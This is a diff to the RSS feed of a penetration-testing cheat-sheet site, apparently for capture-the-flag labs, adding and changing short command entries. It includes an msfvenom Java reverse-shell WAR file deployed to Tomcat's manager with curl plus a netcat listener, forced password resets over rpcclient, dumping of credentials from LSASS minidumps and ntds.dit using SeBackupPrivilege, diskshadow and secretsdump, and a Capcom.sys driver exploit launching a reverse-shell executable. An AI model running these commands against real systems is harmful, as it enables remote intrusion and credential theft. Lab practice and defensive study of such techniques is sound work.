@@ -47,7 +47,7 @@
       <link>https://tldrbins.github.io/apache_tomcat/</link>
       <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
       <guid>https://tldrbins.github.io/apache_tomcat/</guid>
-      <description> RCE (Authenicated) # Create malicious WAR file msfvenom -p java/shell_reverse_tcp LHOST=10.10.14.7 LPORT=1337 -f war -o revshell.war +------------------------------------------+ |Exploit | +------------------------------------------+ |1. Login to Tomcat Web Application Manager| |2. WAR file to deploy -&amp;gt; Deploy | |3. Click /revshell in Applications table | +------------------------------------------+ </description>
+      <description> Config Location /usr/share/tomcat9/etc/tomcat-users.xml /etc/tomcat9/tomcat-users.xml RCE (Authenicated) # Create malicious WAR file msfvenom -p java/shell_reverse_tcp LHOST=10.10.14.10 LPORT=1337 -f war -o revshell.war # Open a nc listener rlwrap nc -lvnp 1337 Manager GUI +------------------------------------------+ |Exploit | +------------------------------------------+ |1. Login to Tomcat Web Application Manager| |2. WAR file to deploy -&amp;gt; Deploy | |3. Click /revshell in Applications table | +------------------------------------------+ Manager Script curl -u &amp;#39;username:password&amp;#39; http://10.10.11.10:8080/manager/text/deploy?path=/revshell --upload-file revshell.war curl -s http://10.10.11.10:8080/revshell </description>
     </item>
     <item>
       <title>Apt</title>
@@ -131,7 +131,7 @@
       <link>https://tldrbins.github.io/dns_enum/</link>
       <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
       <guid>https://tldrbins.github.io/dns_enum/</guid>
-      <description> Zone Transfer dig test.com axfr @10.10.11.10 Domain Discovery dig @10.10.11.10 test.com dig @10.10.11.10 -x 10.10.11.10 dig @10.10.11.10 +short test.com any dig @10.10.11.10 -t NS test.com dig @10.10.11.10 _gc.test.com </description>
+      <description> Zone Transfer dig example.com axfr @10.10.11.10 Domain Discovery dig @10.10.11.10 example.com dig @10.10.11.10 -x 10.10.11.10 dig @10.10.11.10 +short example.com any dig @10.10.11.10 -t NS example.com dig @10.10.11.10 _gc.example.com </description>
     </item>
     <item>
       <title>Docker</title>
@@ -230,6 +230,13 @@
       <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
       <guid>https://tldrbins.github.io/flask_cookie/</guid>
       <description> Flask Cookie pip3 install flask-unsign # Decode flask cookie flask-unsign --decode --cookie &amp;#34;eyJsb2dnZWRfaW4iOnRydWUsInVzZXJuYW1lIjoidGVzdCJ9.Y7wAGA.VajtOMgdcxOwsp-puZW47au5H2k&amp;#34; # Brute force secret key flask-unsign --unsign --cookie &amp;#34;eyJsb2dnZWRfaW4iOnRydWUsInVzZXJuYW1lIjoidGVzdCJ9.Y7wAGA.VajtOMgdcxOwsp-puZW47au5H2k&amp;#34; -w /usr/share/wordlists/rockyou.txt --no-literal-eval # Forge flask cookie flask-unsign --sign --cookie &amp;#34;{&amp;#39;logged_in&amp;#39;: True, &amp;#39;username&amp;#39;: &amp;#39;admin&amp;#39;}&amp;#34; --secret &amp;#34;secret123&amp;#34; </description>
+    </item>
+    <item>
+      <title>ForceChangePassword</title>
+      <link>https://tldrbins.github.io/forcechangepassword/</link>
+      <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
+      <guid>https://tldrbins.github.io/forcechangepassword/</guid>
+      <description> ForceChangePassword rpcclient -U &amp;#39;domain/username%password&amp;#39; 10.10.11.10 -c &amp;#39;setuserinfo2 target_user 23 &amp;#34;Test123!&amp;#34;&amp;#39; </description>
     </item>
     <item>
       <title>Forward Shell</title>
@@ -352,9 +359,9 @@
     </item>
     <item>
       <title>Kerberoasting</title>
-      <link>https://tldrbins.github.io/asp-roasting/</link>
+      <link>https://tldrbins.github.io/roasting/</link>
       <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
-      <guid>https://tldrbins.github.io/asp-roasting/</guid>
+      <guid>https://tldrbins.github.io/roasting/</guid>
       <description> AS_REP Roasting impacket-GetNPUsers example.com/ -usersfile usernames.txt -no-pass -dc-ip 10.10.11.10 Kerberoasting (From Linux) faketime -f +8h impacket-GetNPUsers -request &amp;#39;example.com/user:password&amp;#39; -dc-ip 10.10.11.10 -save -outputfile GetUserSPNs.txt Note: Times skew have to be within 5 minutes in kerberos&#xA;Kerberoasting (From Windows) .\rubeus.exe kerberoast /creduser:example.com\username /credpassword:password </description>
     </item>
     <item>
@@ -411,7 +418,7 @@
       <link>https://tldrbins.github.io/memory_dump/</link>
       <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
       <guid>https://tldrbins.github.io/memory_dump/</guid>
-      <description> binwalk Download binwalk&#xA;# Extract files from memory dump binwalk -M -e memory.dmp </description>
+      <description> binwalk Download binwalk&#xA;# Extract files from memory dump binwalk -M -e memory.dmp Mini Dump pypykatz lsa minidump memory.dmp </description>
     </item>
     <item>
       <title>Metasploit</title>
@@ -659,11 +666,18 @@
       <description> searchsploit # Search service with specific version # For example: samba 3.0 searchsploit samba 3.0 # Read the exploit searchsploit -x unix/remote/16320.rb # Copy the exploit searchsploit -m unix/remote/16320.rb </description>
     </item>
     <item>
+      <title>SeBackupPrivilege/SeRestorePrivilege</title>
+      <link>https://tldrbins.github.io/sebackupprivilege/</link>
+      <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
+      <guid>https://tldrbins.github.io/sebackupprivilege/</guid>
+      <description>robocopy # For example robocopy /b &amp;lt;target_dir_path&amp;gt; C:\Windows\Tasks &amp;lt;target_file&amp;gt; Helper dlls SeBackupPrivilegeUtils.dll&#xA;SeBackupPrivilegeCmdLets.dll&#xA;import-module .\SeBackupPrivilegeCmdLets.dll import-module .\SeBackupPrivilegeUtils.dll Copy-FileSeBackupPrivilege &amp;lt;target_file_path&amp;gt; C:\Windows\Tasks\&amp;lt;target_file&amp;gt; # For example Copy-FileSeBackupPrivilege C:\Windows\ntds\ntds.dit C:\Windows\Tasks\ntds.dit diskshadow Create a .dsh file set context persistent nowriters set metadata C:\Windows\Tasks\test.cab set verbose on add volume c: alias test create expose %test% x: # Convert to dos format unix2dos vss.dsh Run vss.dsh # Upload and run diskshadow /s C:\Windows\Tasks\vss.dsh Host a smb server (In Linux) impacket-smbserver share .</description>
+    </item>
+    <item>
       <title>secretsdump</title>
       <link>https://tldrbins.github.io/secretsdump/</link>
       <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
       <guid>https://tldrbins.github.io/secretsdump/</guid>
-      <description> Impacket Download Impacket&#xA;secretsdump With ntds.dit and SYSTEM hive impacket-secretsdump -ntds ntds.dit -system system.bin LOCAL With SAM, SYSTEM and SECURITY Hives impacket-secretsdump -sam SAM -security SECURITY -system SYSTEM LOCAL With dcsync right impacket-secretsdump username:password@10.10.11.10 </description>
+      <description> Impacket Download Impacket&#xA;secretsdump With ntds.dit and SYSTEM hive impacket-secretsdump -ntds ntds.dit -system system LOCAL With SAM, SYSTEM and SECURITY Hives impacket-secretsdump -sam SAM -security SECURITY -system SYSTEM LOCAL With dcsync right impacket-secretsdump username:password@10.10.11.10 </description>
     </item>
     <item>
       <title>Secure String</title>
@@ -671,6 +685,13 @@
       <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
       <guid>https://tldrbins.github.io/secrue_string/</guid>
       <description> Decrypt secure string $s = cat pass.xml $ss = Convertto-securestring -string $s $cred = new-object -typename System.Management.Automation.PSCredential -argumentlist &amp;#34;administrator&amp;#34;, $ss $cred.GetNetworkCredential().password </description>
+    </item>
+    <item>
+      <title>SeLoadDriverPrivilege</title>
+      <link>https://tldrbins.github.io/seloaddriverprivilege/</link>
+      <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
+      <guid>https://tldrbins.github.io/seloaddriverprivilege/</guid>
+      <description>SeLoadDriverPrivilege Compile eoploaddriver eoploaddriver.cpp&#xA;1. Open Visual Studio 2022 2. Create a new project 3. Project Template : C++ Console App 4. Project Name : Eoploaddriver 5. Replace code : eoploaddriver.cpp 6. Remove header : `include &amp;#34;stdafx.h&amp;#34;` 7. Release -&amp;gt; x64 8. Build -&amp;gt; Build Solution 9. Exported to C:\Users\user\source\repos\Eoploaddriver\x64\Release\Eoploaddriver.exe Download Capcom.sys Capcom.sys&#xA;Compile ExploitCapcom ExploitCapcom&#xA;1. Double click ExploitCapcom.sln 2. Replace the payload to `TCHAR CommandLine[] = TEXT(&amp;#34;C:\\Windows\\Tasks\\rev.exe&amp;#34;);` 3.</description>
     </item>
     <item>
       <title>Server Operators</title>
